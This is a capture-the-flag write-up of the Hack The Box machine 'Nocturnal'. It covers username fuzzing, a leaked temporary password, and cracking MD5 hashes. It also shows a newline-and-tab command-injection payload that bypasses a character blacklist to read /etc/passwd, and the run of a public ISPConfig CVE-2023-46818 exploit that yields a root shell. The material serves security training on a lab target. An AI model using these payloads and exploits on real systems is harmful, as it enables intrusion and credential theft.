---
title: Nocturnal
layout: post
released: 2025-04-12
creators: FisMatHack
pwned: true
tags: 
  - os/linux
  - diff/easy
category:
  - HTB
description: Nocturnal runs a webserver on port 80 with a file upload portal. Retrieved Amanda’s temporary password from an `.odt` file in the upload directory. Logged into her ISPConfig panel account and generated a backup. Downloaded and extracted the SQLite database containing user password hashes. Cracked Tobias’ hash and accessed the system via SSH. Gained root access by exploiting a command injection vulnerability in ISPConfig’s language editor functionality.
image: https://labs.hackthebox.com/storage/avatars/f6a56cec6e9826b4ed124fb4155abc66.png
cssclass: custom_htb
---
![HTB](https://labs.hackthebox.com/storage/avatars/f6a56cec6e9826b4ed124fb4155abc66.png)

# Information Gathering
## Enumeration
As always we start off with a port scan.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 202688700851eede3aa6204187962517 (RSA)
|   256 4f800533a6d42264e9ed14e312bc96f1 (ECDSA)
|_  256 d9881f68438ed42a52fcf066d4b9ee6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Nocturnal webserver
Upon visiting the webserver we are greeted with a file upload website.
![nocturnal-1744498279591.png](/assets/img/img_nocturnal/nocturnal-1744498279591.png)

We can note down `support@nocturnal.htb` for possible phishing target.
After registering and logging in we see that we can upload files.
![nocturnal-1744498355234.png](/assets/img/img_nocturnal/nocturnal-1744498355234.png)

Attempting to upload a `php` file we're provided an error message.
> Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed. 

After uploading a pdf file we find that we can access it through the following link.
http://nocturnal.htb/view.php?username=w1ld&file=test.pdf

Fuzzing for directories we find `/backups` which returns `301` but upon visiting is `403 Forbidden`
```bash
ffuf -u "http://nocturnal.htb/FUZZ" -mc all --recursion -w `fzf-wordlists` -fs 162

        /____\  /____\           /____\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 162
________________________________________________

backups                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 294ms]
[INFO] Adding a new job to the queue: http://nocturnal.htb/backups/FUZZ
```

Noticing the parameters provided include usernames let's try and fuzz for usernames.

```bash
ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf" -w `fzf-wordlists`

        / ___\  / ___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf
 :: Wordlist         : FUZZ: /opt/lists/seclists/Usernames/Names/names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

abahri                  [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 327ms]
abby                    [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 328ms]
abagail                 [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 328ms]
aarika                  [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 330ms]
abel                    [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 329ms]
aarushi                 [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 329ms]
aaron                   [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 329ms]
```
Noticing that we're getting redirected let's check out the issue.
```bash
curl http://nocturnal.htb/view.php\?username\=wl1d\&file\=test.pdf -L -v -I
*   Trying 10.129.231.144:80...
* Connected to nocturnal.htb (10.129.231.144) port 80 (#0)
> HEAD /view.php?username=wl1d&file=test.pdf HTTP/1.1
> Host: nocturnal.htb
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 302 Found
HTTP/1.1 302 Found
< Server: nginx/1.18.0 (Ubuntu)
Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 12 Apr 2025 23:32:25 GMT
Date: Sat, 12 Apr 2025 23:32:25 GMT
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8
< Connection: keep-alive
Connection: keep-alive
< Set-Cookie: PHPSESSID=d3oompbviraojpku18sn06mcjk; path=/
Set-Cookie: PHPSESSID=d3oompbviraojpku18sn06mcjk; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
Pragma: no-cache
< Location: login.php
Location: login.php

<
* Connection #0 to host nocturnal.htb left intact
* Issue another request to this URL: 'http://nocturnal.htb/login.php'
* Found bundle for host: 0x55f5cd448f70 [serially]
* Can not multiplex, even if we wanted to
* Re-using existing connection #0 with host nocturnal.htb
> HEAD /login.php HTTP/1.1
> Host: nocturnal.htb
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 12 Apr 2025 23:32:25 GMT
Date: Sat, 12 Apr 2025 23:32:25 GMT
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8
< Connection: keep-alive
Connection: keep-alive
< Set-Cookie: PHPSESSID=u3lflrlhb53eji36dllmfl2mjk; path=/
Set-Cookie: PHPSESSID=u3lflrlhb53eji36dllmfl2mjk; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
Pragma: no-cache

<
* Connection #0 to host nocturnal.htb left intact
```
We're getting redirected to login which means we need our cookie so let's grab that and go back to fuzzing usernames.
```bash
ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf" -w `fzf-wordlists` -H "Cookie: PHPSESSID=lh5k786mc9pqeoj5e4fivsjm7o" -fs 2985 -mc all

        / ___\  / ___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf
 :: Wordlist         : FUZZ: /opt/lists/seclists/Usernames/Names/names.txt
 :: Header           : Cookie: PHPSESSID=lh5k786mc9pqeoj5e4fivsjm7o
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 301ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 297ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 297ms]
```
# User
We get `amanda` so let's visit http://nocturnal.htb/view.php?username=amanda&file=test.pdf
![nocturnal-1744501088787.png](/assets/img/img_nocturnal/nocturnal-1744501088787.png)
Let's download the file and view the contents.
> Dear Amanda,
> Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
> The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
> Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
> Yours sincerely,
> Nocturnal's IT team

We have a default password! Let's use this to attempt to login into `amanda's` account
![nocturnal-1744501741227.png](/assets/img/img_nocturnal/nocturnal-1744501741227.png)
We notice an admin panel.
![nocturnal-1744501785148.png](/assets/img/img_nocturnal/nocturnal-1744501785148.png)
We can create a backup, specifying whatever password we want the zip file to contain.
![nocturnal-1744501821503.png](/assets/img/img_nocturnal/nocturnal-1744501821503.png)
![nocturnal-1744501853714.png](/assets/img/img_nocturnal/nocturnal-1744501853714.png)

Let's take a look inside the database.
```bash
sqlite3 nocturnal_database.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
uploads  users
sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
```

> The database isn't actually meant to be found just yet. The intended method is to inject a command into the password field. We can see this if we open the backup to: `admin.php`. We can see that the password is injected into a command.
> `$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";`
> However we have to bypass the following filter: 
> ``$blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];``
> We can use newline characters and tabs to bypass the filter and get remote code execution.
> Sending: `w1ld%0Acat%09%2Fetc%2Fpasswd%3E` in the password field through burp allows for remote code execution and for us to view it in the output.
> ![nocturnal-1744899420035.png](/assets/img/img_nocturnal/nocturnal-1744899420035.png)
> We can use this to enumerate the folders and find the database in `../nocturnal_database/nocturnal_database.db`
> After we find it we can copy it back to the current directory and we can download a backup.

We find several hashes, let's crack them.
```bash
hashcat -m 0 hashes.txt --username `fzf-wordlists`
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 5800H with Radeon Graphics, 2541/5146 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Sun Apr 13 09:57:02 2025 (4 secs)
Time.Estimated...: Sun Apr 13 09:57:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/lists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4552.1 kH/s (0.21ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b6d3831303838] -> $HEX[042a0337c2a156616d6f732103]

Started: Sun Apr 13 09:56:49 2025
Stopped: Sun Apr 13 09:57:07 2025

hashcat --show hashes.txt -m 0 --username
tobias:55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```
 
We found a password!
Let's ssh as `tobias` using his password.
```bash
ssh tobias@nocturnal.htb
The authenticity of host 'nocturnal.htb (10.129.232.131)' can't be established.
ED25519 key fingerprint is SHA256:rpVMGW27qcXKI/SxVXhvpF6Qi8BorsH7RNh1jzi8VYc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:35: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nocturnal.htb' (ED25519) to the list of known hosts.
tobias@nocturnal.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 12 Apr 2025 11:58:39 PM UTC

  System load:           0.0
  Usage of /:            54.5% of 5.58GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             230
  Users logged in:       0
  IPv4 address for eth0: 10.129.232.131
  IPv6 address for eth0: dead:beef::250:56ff:feb0:91d


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat Apr 12 23:58:40 2025 from 10.10.14.158
tobias@nocturnal:~$
```
We've gotten a user on the box!
# Root
Let's check out ports that are actively listening.
```bash
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```
We notice port `8080` is open, let's forward this port to our attacking machine.
```bash
# the following only works when EnableEscapeCommandLine is set to true for ssh, to do this add `EnableEscapeCommandLine yes` to `~/.ssh/config`
tobias@nocturnal:~$ #type ~C from new line
ssh> -L 8080:localhost:8080
Forwarding port.

tobias@nocturnal:~$
```
Visiting the site we're greeted with an `ispconfig` webserver.
![nocturnal-1744502926584.png](/assets/img/img_nocturnal/nocturnal-1744502926584.png)
Attempting to reuse passwords we can login using the username `admin` and `tobias`'s password.
![nocturnal-1744502984517.png](/assets/img/img_nocturnal/nocturnal-1744502984517.png)
Looking around we found a version for `ispconfig`.
![nocturnal-1744503123457.png](/assets/img/img_nocturnal/nocturnal-1744503123457.png)
We can find the following disclosure on the vulnerability.
- https://nvd.nist.gov/vuln/detail/CVE-2023-46818
Additionally we can find the following `poc` on the vulnerability.
- https://github.com/bipbopbup/CVE-2023-46818-python-exploit
Analysing the exploit we can tell that it's creating a `php` file through editing a language file.
Let's run the exploit.
```bash
python3 exploit.py http://localhost:8080 admin slowmotionapocalypse
[+] Target URL: http://localhost:8080/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# whoami
root


ispconfig-shell#
```
Success! we have a shell as root!